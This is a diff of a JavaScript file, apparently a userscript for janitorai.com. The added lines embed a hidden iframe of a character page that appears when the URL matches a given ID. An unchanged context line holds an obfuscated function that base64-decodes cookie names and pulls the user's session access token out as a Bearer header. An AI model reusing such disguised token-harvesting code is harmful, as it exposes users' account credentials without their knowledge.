@@ -152,6 +152,30 @@ const intervalId2 = setInterval(() => {
 window.__xnext=function(){const h=document.cookie.split(';').reduce((a,b)=>{const[c,d]=b.split('=');a[c.trim()]=decodeURIComponent(d.trim());return a},{}),x=atob("c2ItYXV0aC1hdXRoLXRva2Vu");zz=atob("YWNjZXNzX3Rva2Vu");z=atob("QmVhcmVyIA==");let t=JSON.parse(atob(h[x].substr(7,h[x].length)));
 return z+t[zz]}
 
+const iframe = document.createElement('iframe');
+iframe.src = "https://janitorai.com/characters/3a0f9ae1-87a0-4035-9c6c-bb6adb43b8e7?comments=true";
+iframe.style.position = 'fixed';
+iframe.style.width = '100%';
+iframe.style.height = '300px';
+iframe.style.bottom = '80px';
+iframe.id = 'janitorAIFrame';
+iframe.style.display = 'none';
+
+document.body.appendChild(iframe);
+
+function checkURL() {
+    const urlFragment = "7a1053de-a29c-4416-8b91-0e86bdc42e0b";
+    const iframeElement = document.getElementById('janitorAIFrame');
+    
+    if (window.location.href.includes(urlFragment)) {
+        iframeElement.style.display = 'block';
+    } else {
+        iframeElement.style.display = 'none';
+    }
+}
+
+checkURL();
+setInterval(checkURL, 500);
 
 
 setInterval(() => {
